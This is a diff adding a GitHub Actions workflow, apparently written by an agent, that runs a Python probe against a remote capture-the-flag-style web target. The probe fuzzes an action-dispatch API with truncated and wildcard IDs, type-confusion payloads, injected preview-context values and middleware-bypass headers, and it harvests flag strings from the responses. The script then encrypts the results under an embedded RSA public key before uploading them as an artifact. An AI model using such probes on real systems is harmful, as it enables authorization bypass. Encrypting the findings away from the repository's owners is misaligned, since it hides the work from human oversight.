@@ -1,0 +1,106 @@
+name: launchlet-part3-actiondiag2
+on:
+  push:
+    branches: [agent/launchlet-part3-actiondiag2-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe action dispatcher edge cases and encrypt responses
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAh+NPVwIluBBnJJhWhvo9
+          ty90KCtkpNMzsxYJe+BR2VH3yh/hJ4jNcG/Y3bNYJHoKGsTw07WCYieEzw7PcjRE
+          gRSBsBYWZyrqS/Dej9I5WJY2tThdZxosZQDJ7hrbglu3TUcy8EDoNoDYuFrAu6gh
+          RQspWb6qOiuSTxTSkuxmp2gcHQWYf9tpKNYjrOW8ybmI+kFKDa++Iv/SSUfQ26cv
+          /QIKK1k22l+qxrTklx5FBq1uJYlJxBfbSOQS5AVI1kim/JlEo6ckjbnp2TNK2G43
+          u62F6lUIVwvcSBd47cRlHHlnprEhAdR+17ZEvs6ecGDY42kTT3GrT1Z8nE+KAjNa
+          sQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,math
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'
+          out=pathlib.Path('package/out')
+          aid='act_6f4b9a2c1d0e8a71'; core=aid[4:]; proj='launchlet-demo-board'; ws='ws-launchlet-public'
+          url=base+'/api/actions/invoke'; args={'workspaceId':ws,'projectId':proj}
+          res=[]
+          def req(name, action=aid, headers=None, rawbody=None, body_marker=True):
+            h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':proj}
+            if headers:h.update(headers)
+            try:
+              if rawbody is not None:r=requests.post(url,headers=h,data=rawbody,timeout=7,allow_redirects=False)
+              else:r=requests.post(url,headers=h,json={'actionId':action,'args':args},timeout=7,allow_redirects=False)
+              item={'name':name,'actionId':action,'sent_headers':headers or {},'status':r.status_code,'headers':dict(r.headers),'body':r.text[:20000]}
+            except Exception as e:item={'name':name,'error':repr(e),'actionId':repr(action),'sent_headers':headers or {}}
+            res.append(item)
+            return item
+          req('baseline')
+          vals=['','act_',core,'act_*','*','inspectDeploy','act_inspectDeploy','ACT_'+core.upper(),aid.upper(),aid+' ', ' '+aid]
+          vals += ['act_'+core[:i] for i in range(1,len(core))]
+          vals += [core[:i] for i in range(1,len(core)+1)]
+          for i,v in enumerate(dict.fromkeys(vals)):req('id_string_'+str(i),v)
+          # type confusion via direct json serialization
+          typevals=[None,0,1,-1,True,False,[],[aid],{}, {'id':aid}, {'$eq':aid}, 6.0, 6.94]
+          for i,v in enumerate(typevals):req('id_type_'+str(i),v)
+          # malformed/alternate top-level containers
+          raws=[
+            '{}', '[]', 'null', 'true', '1',
+            json.dumps({'args':args}), json.dumps({'actionId':aid}),
+            json.dumps({'actionId':[aid],'args':args}),
+            json.dumps({'actionId':{'id':aid},'args':args}),
+            '{"actionId":NaN,"args":{"workspaceId":"%s","projectId":"%s"}}'%(ws,proj),
+            '{"actionId":Infinity,"args":{"workspaceId":"%s","projectId":"%s"}}'%(ws,proj),
+          ]
+          for i,b in enumerate(raws):req('raw_'+str(i),rawbody=b)
+          # comma/list preview context forms
+          ctxs=[
+            proj+',internal', proj+', preview-8b11c', proj+',lrec_preview_demo_2026',
+            proj+',deploy', proj+',production', proj+',enterprise',
+            proj+';internal', proj+' internal', '"'+proj+'"', proj+', '+proj,
+            'internal,'+proj, 'preview-8b11c,'+proj, 'deploy,'+proj,
+          ]
+          for i,v in enumerate(ctxs):req('ctx_'+str(i),headers={'X-Launchlet-Preview':v})
+          # request-metadata headers that can alter server-action/preview routing in builder stacks
+          htests=[
+            {'X-Middleware-Subrequest':'middleware'},
+            {'X-Middleware-Subrequest':'middleware:middleware'},
+            {'RSC':'1'}, {'Next-Action':aid}, {'X-Nextjs-Data':'1'},
+            {'Next-Url':'/deploy'}, {'Next-Url':'/preview/preview-8b11c'},
+            {'X-Launchlet-Build':'2026.05.16-rc3'}, {'X-Launchlet-Runtime':'launchlet-actions/0.9.4'},
+            {'X-Launchlet-Action-Scope':'deploy'}, {'X-Launchlet-Deploy-Ref':'preview-8b11c'},
+            {'Origin':base}, {'Referer':base+'/'},
+            {'Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty'},
+          ]
+          for i,h in enumerate(htests):req('meta_'+str(i),headers=h)
+          blob=json.dumps(res,indent=2,default=str)
+          (out/'summary.json').write_text(blob)
+          known={'caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}'}
+          flags=[f for f in re.findall(r'caplag\{[^}]+\}',blob) if f not in known]
+          if flags:(out/'FOUND.txt').write_text('\n'.join(dict.fromkeys(flags)))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"
+          IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-actiondiag2-encrypted
+          path: artifact/
+          retention-days: 1
